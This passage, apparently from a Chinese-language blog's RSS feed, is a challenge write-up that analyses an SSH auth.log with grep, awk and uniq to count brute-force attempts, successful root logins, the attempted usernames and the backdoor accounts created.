&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-1/QQ20250314-123639.jpg"
width="1296"
height="621"
srcset="https://baozongwi.xyz/p/xuanji-chapter-1/QQ20250314-123639_hu_e1a0902fef9e7fa9.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-1/QQ20250314-123639_hu_17af5fb158f35004.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="208"
data-flex-basis="500px"
>&lt;/p>
&lt;p>找到特征之后其实就可以写命令了&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat auth.log.1 | grep -a &amp;#34;Failed password for root&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-1/QQ20250314-123743.jpg"
width="1068"
height="155"
srcset="https://baozongwi.xyz/p/xuanji-chapter-1/QQ20250314-123743_hu_1c9d29872b261a81.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-1/QQ20250314-123743_hu_786cc5899c7e6abc.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="689"
data-flex-basis="1653px"
>&lt;/p>
&lt;p>但是要自己数次数，我们再优化一下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat auth.log.1 | grep -a &amp;#34;Failed password for root&amp;#34; | awk &amp;#39;{print $11}&amp;#39; | sort | uniq -c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>提取第11列，&lt;code>uniq -c&lt;/code>计数，&lt;code>sort&lt;/code>排序，第二题登录成功的，我们换一下特征就出了&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat auth.log.1 | grep -a &amp;#34;Accepted password for root&amp;#34; | awk &amp;#39;{print $11}&amp;#39; | sort | uniq -c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>爆破用户名的字典就是提取用户名嘛，直接提取用户名&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat auth.log.1 | grep -a &amp;#34;Failed password&amp;#34; | awk &amp;#39;{print $11}&amp;#39;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>但是这样子有IP什么的混在里面，得给过滤了&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat auth.log.1 | grep -a &amp;#34;Failed password&amp;#34; | awk &amp;#39;{if ($11 !~ /from/ &amp;amp;&amp;amp; $11 !~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) print $11}&amp;#39;| sort | uniq -c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这样子就能拿到五个用户名，当然别忘了我们的&lt;code>root&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-1/QQ20250314-124717.jpg"
width="1266"
height="150"
srcset="https://baozongwi.xyz/p/xuanji-chapter-1/QQ20250314-124717_hu_d46c581c3335b495.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-1/QQ20250314-124717_hu_bf0a6cf0ca64122a.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="844"
data-flex-basis="2025px"
>&lt;/p>
&lt;p>创建后门用户直接写就好了&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat auth.log.1 |grep -a &amp;#34;new user&amp;#34; |awk &amp;#39;{print $8}&amp;#39;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>得到两个，都交一下就好了&lt;/p></description></item></channel></rss>